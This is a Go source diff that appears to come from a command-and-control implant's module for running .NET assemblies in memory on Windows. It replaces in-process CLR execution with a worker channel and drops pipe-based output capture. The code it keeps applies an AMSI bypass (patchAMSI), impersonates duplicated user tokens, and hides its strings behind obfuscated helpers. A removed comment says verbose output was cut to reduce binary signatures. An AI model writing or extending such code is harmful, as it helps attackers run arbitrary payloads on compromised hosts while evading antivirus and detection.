@@ -11,17 +11,8 @@ import (
 	"strings"
 	"syscall"
 	"time"
-	"unsafe"
-
-	clr "github.com/almounah/go-buena-clr"
 )
 
-const (
-	// These should match the constants in action_inline_assembly.go
-	STD_OUTPUT_HANDLE_ASYNC    = uintptr(^uint(11 - 1)) // -11 as uintptr
-	STD_ERROR_HANDLE_ASYNC     = uintptr(^uint(12 - 1)) // -12 as uintptr
-	COINIT_MULTITHREADED_ASYNC = 0x0
-)
 
 // InlineAssemblyAsync template indices (must match server's common.go)
 // Uses shared template from action_inline_assembly.go via iaTpl()
@@ -253,12 +244,6 @@ func (c *InlineAssemblyAsyncCommand) executeWindowsAssemblyAsync(assemblyBytes [
 	// Write initial header to job output
 	job.OutputMutex.Lock()
 
-	// Detect assembly type
-	isDLL := c.isDLLAssembly(assemblyBytes)
-	_ = isDLL // assemblyType detection - used for bypass selection
-
-	// Removed verbose output to reduce binary signatures
-	// Only apply bypasses silently
 	if config.BypassAMSI {
 		patchAMSI()
 	}
@@ -274,7 +259,6 @@ func (c *InlineAssemblyAsyncCommand) executeWindowsAssemblyAsync(assemblyBytes [
 
 // executeWithAsyncPipeCapture captures output with protection against exit and token context
 func (c *InlineAssemblyAsyncCommand) executeWithAsyncPipeCapture(assemblyBytes []byte, arguments []string, job *AssemblyJob, executionNumber int, hasRunfor bool, runforDuration int, tokenContext *AssemblyTokenContext) (int, error) {
-
 	type execResult struct {
 		code int
 		err  error
@@ -289,22 +273,19 @@ func (c *InlineAssemblyAsyncCommand) executeWithAsyncPipeCapture(assemblyBytes [
 		executionTimeout = time.Duration(runforDuration+10) * time.Second
 	}
 
-	// Run the entire execution in a goroutine
 	go func() {
 		runtime.LockOSThread()
 		defer runtime.UnlockOSThread()
 
 		defer func() {
-			// Recover from any panic/exit attempt
 			if r := recover(); r != nil {
 				job.OutputMutex.Lock()
 				job.Output.WriteString(iaaDoneExitPrev())
 				job.OutputMutex.Unlock()
-				resultChan <- execResult{0, nil} // Treat as success
+				resultChan <- execResult{0, nil}
 			}
 		}()
 
-		// Apply token context if provided
 		var cleanupToken func()
 		var duplicatedTokenHandle syscall.Handle
 
@@ -313,146 +294,38 @@ func (c *InlineAssemblyAsyncCommand) executeWithAsyncPipeCapture(assemblyBytes [
 			defer cleanupToken()
 
 			if duplicatedTokenHandle != 0 {
-				// Apply impersonation for this thread
-				err := ImpersonateLoggedOnUser(duplicatedTokenHandle)
-				if err != nil {
-				} else {
-					// Ensure we revert after execution
-					defer func() {
-						RevertToSelf()
-					}()
+				if err := ImpersonateLoggedOnUser(duplicatedTokenHandle); err == nil {
+					defer RevertToSelf()
 				}
 			}
 		}
 
-		// Initialize COM in this thread
-		hr, _, _ := coInitializeEx.Call(0, COINIT_MULTITHREADED_ASYNC)
-		if hr == 0 {
-			defer coUninitialize.Call()
-		}
-
-		// Create pipe for output capture
-		var readPipe, writePipe syscall.Handle
-		var sa syscall.SecurityAttributes
-		sa.Length = uint32(unsafe.Sizeof(sa))
-		sa.InheritHandle = 1
-
-		err := syscall.CreatePipe(&readPipe, &writePipe, &sa, 1024*1024) // 1MB buffer
-		if err != nil {
-			// Execute without capture but with protection
-			retCode, err := c.executeProtectedDirect(assemblyBytes, arguments, hasRunfor, runforDuration, duplicatedTokenHandle)
-			resultChan <- execResult{retCode, err}
-			return
-		}
-		defer func() {
-			if readPipe != syscall.InvalidHandle {
-				syscall.CloseHandle(readPipe)
-			}
-		}()
-
-		// Save original handles
-		origStdout, _, _ := getStdHandle.Call(STD_OUTPUT_HANDLE_ASYNC)
-		origStderr, _, _ := getStdHandle.Call(STD_ERROR_HANDLE_ASYNC)
-
-		// Check/create console
-		consoleCreated := false
-		if wnd, _, _ := getConsoleWindow.Call(); wnd == 0 {
-			if ret, _, _ := allocConsole.Call(); ret != 0 {
-				consoleCreated = true
-			}
-		}
-
-		// Redirect stdout/stderr to our pipe
-		setStdHandle.Call(STD_OUTPUT_HANDLE_ASYNC, uintptr(writePipe))
-		setStdHandle.Call(STD_ERROR_HANDLE_ASYNC, uintptr(writePipe))
-
-		// Start reader goroutine
-		stopReader := make(chan struct{})
-		readerDone := make(chan struct{})
-
-		go func() {
-			defer close(readerDone)
-			buffer := make([]byte, 4096)
-			totalRead := 0
-
-			for {
-				select {
-				case <-stopReader:
-					return
-				default:
-					var bytesRead uint32
-					ret, _, _ := readFile.Call(
-						uintptr(readPipe),
-						uintptr(unsafe.Pointer(&buffer[0])),
-						uintptr(len(buffer)),
-						uintptr(unsafe.Pointer(&bytesRead)),
-						0,
-					)
-
-					if ret != 0 && bytesRead > 0 {
-						totalRead += int(bytesRead)
-						output := string(buffer[:bytesRead])
-
-						// Write to job output
-						job.OutputMutex.Lock()
-						job.Output.WriteString(output)
-						job.OutputMutex.Unlock()
-
-					} else {
-						// No data available, wait a bit
-						time.Sleep(50 * time.Millisecond)
-					}
-				}
-			}
-		}()
-
-		// Execute the assembly with protection
-
-		// Detect runtime version
 		targetRuntime := iaClrV4()
 		if bytes.Contains(assemblyBytes, []byte(iaClrV2Full())) {
 			targetRuntime = iaClrV2()
 		}
 
-		// Execute with panic protection
 		var retCode int32
 		var execErr error
 
-		execDone := make(chan bool)
-		go func() {
-			// Lock this goroutine to its OS thread so token impersonation
-			// (which is per-thread) is not lost to goroutine migration.
-			runtime.LockOSThread()
-			defer runtime.UnlockOSThread()
-			defer func() {
-				if r := recover(); r != nil {
-					// Check if it's an expected exit (like from /runfor)
-					if hasRunfor {
-						job.OutputMutex.Lock()
-						job.Output.WriteString(iaaDoneAfterPre() + fmt.Sprintf("%d", runforDuration) + iaaDoneAfterSuf())
-						job.OutputMutex.Unlock()
-					}
-					execErr = nil // Not an error, just normal termination
-					retCode = 0
-				}
-				execDone <- true
-			}()
+		ensureCLRWorker()
+		clrResultCh := make(chan clrWorkResult, 1)
+		clrWorkerCh <- clrWorkRequest{
+			assemblyBytes: assemblyBytes,
+			arguments:     arguments,
+			targetRuntime: targetRuntime,
+			resultCh:      clrResultCh,
+		}
 
-			// Apply impersonation in this goroutine for the assembly execution
-			if duplicatedTokenHandle != 0 {
-				err := ImpersonateLoggedOnUser(duplicatedTokenHandle)
-				if err != nil {
-				} else {
-					defer RevertToSelf()
-				}
-			}
-
-			retCode, execErr = clr.ExecuteByteArray(targetRuntime, assemblyBytes, arguments)
-		}()
-
-		// Wait for execution with appropriate timeout
 		select {
-		case <-execDone:
+		case res := <-clrResultCh:
+			execErr = res.err
+			retCode = int32(res.exitCode)
+			if res.output != "" {
+				job.OutputMutex.Lock()
+				job.Output.WriteString(res.output)
+				job.OutputMutex.Unlock()
+			}
 		case <-time.After(executionTimeout):
 			job.OutputMutex.Lock()
 			if hasRunfor {
@@ -465,37 +338,6 @@ func (c *InlineAssemblyAsyncCommand) executeWithAsyncPipeCapture(assemblyBytes [
 			execErr = nil
 		}
 
-		// Close write pipe to signal EOF
-		syscall.CloseHandle(writePipe)
-
-		// Signal reader to stop and wait briefly for final output
-		close(stopReader)
-		select {
-		case <-readerDone:
-		case <-time.After(2 * time.Second):
-			// Reader goroutine is likely blocked in a Windows ReadFile
-			// syscall which cannot observe the stopReader channel.
-			// Close the read end of the pipe to force ReadFile to return
-			// with an error, allowing the goroutine to exit cleanly.
-			syscall.CloseHandle(readPipe)
-			readPipe = syscall.InvalidHandle // prevent the deferred close from double-closing
-			// Give the reader a moment to notice the broken pipe
-			select {
-			case <-readerDone:
-			case <-time.After(500 * time.Millisecond):
-			}
-		}
-
-		// Restore handles
-		setStdHandle.Call(STD_OUTPUT_HANDLE_ASYNC, origStdout)
-		setStdHandle.Call(STD_ERROR_HANDLE_ASYNC, origStderr)
-
-		// Clean up console if we created it
-		if consoleCreated {
-			freeConsole.Call()
-		}
-
-		// Check for specific exit-related errors
 		if execErr != nil {
 			errStr := strings.ToLower(execErr.Error())
 			if strings.Contains(errStr, iaaKwExit()) || strings.Contains(errStr, iaaKwTerminate()) {
@@ -511,16 +353,12 @@ func (c *InlineAssemblyAsyncCommand) executeWithAsyncPipeCapture(assemblyBytes [
 			}
 		}
 
-		// If no output was captured but assembly ran successfully, add a note
 		job.OutputMutex.Lock()
-		outputLen := job.Output.Len()
-		if outputLen == 0 && execErr == nil {
+		if job.Output.Len() == 0 && execErr == nil {
 			job.Output.WriteString(Succ(S18) + "\n")
 		}
-		// fmt.Printf("[DEBUG ASYNC] Final output buffer size: %d bytes\n", job.Output.Len())
 		job.OutputMutex.Unlock()
 
-		// Send result back
 		resultChan <- execResult{int(retCode), execErr}
 		job.Output.WriteString(iaaOutputEnd())
 	}()
@@ -545,85 +383,4 @@ func (c *InlineAssemblyAsyncCommand) executeWithAsyncPipeCapture(assemblyBytes [
 	}
 }
 
-// executeProtectedDirect executes without pipe capture but with exit protection and token
-func (c *InlineAssemblyAsyncCommand) executeProtectedDirect(assemblyBytes []byte, arguments []string, hasRunfor bool, runforDuration int, tokenHandle syscall.Handle) (int, error) {
-	targetRuntime := iaClrV4()
-	if bytes.Contains(assemblyBytes, []byte(iaClrV2Full())) {
-		targetRuntime = iaClrV2()
-	}
 
-	var retCode int32
-	var execErr error
-
-	// Set up timeout
-	timeout := 24 * time.Hour
-	if hasRunfor {
-		timeout = time.Duration(runforDuration+10) * time.Second
-	}
-
-	done := make(chan bool)
-
-	go func() {
-		// Lock this goroutine to its OS thread so token impersonation
-		// (which is per-thread) is not lost to goroutine migration.
-		runtime.LockOSThread()
-		defer runtime.UnlockOSThread()
-		defer func() {
-			if r := recover(); r != nil {
-				execErr = nil
-				retCode = 0
-			}
-			done <- true
-		}()
-
-		// Apply token impersonation if we have a handle
-		if tokenHandle != 0 {
-			err := ImpersonateLoggedOnUser(tokenHandle)
-			if err == nil {
-				defer RevertToSelf()
-			}
-		}
-
-		retCode, execErr = clr.ExecuteByteArray(targetRuntime, assemblyBytes, arguments)
-	}()
-
-	select {
-	case <-done:
-		// Completed
-	case <-time.After(timeout):
-		// Timeout - treat as successful completion for /runfor
-		if hasRunfor {
-			return 0, nil
-		}
-		return -1, fmt.Errorf(Err(E9))
-	}
-
-	return int(retCode), execErr
-}
-
-// isDLLAssembly checks if the assembly is a DLL
-func (c *InlineAssemblyAsyncCommand) isDLLAssembly(assemblyBytes []byte) bool {
-	// Check PE headers to determine if it's a DLL
-	if len(assemblyBytes) < 0x3C+4 {
-		return false
-	}
-
-	// Check for MZ header
-	if assemblyBytes[0] != 'M' || assemblyBytes[1] != 'Z' {
-		return false
-	}
-
-	// Get PE header offset
-	peOffset := int32(assemblyBytes[0x3C]) |
-		int32(assemblyBytes[0x3D])<<8 |
-		int32(assemblyBytes[0x3E])<<16 |
-		int32(assemblyBytes[0x3F])<<24
-
-	if int(peOffset+0x17) >= len(assemblyBytes) {
-		return false
-	}
-
-	// Check characteristics for DLL flag (0x2000)
-	characteristics := uint16(assemblyBytes[peOffset+0x16]) | uint16(assemblyBytes[peOffset+0x17])<<8
-	return (characteristics & 0x2000) != 0
-}
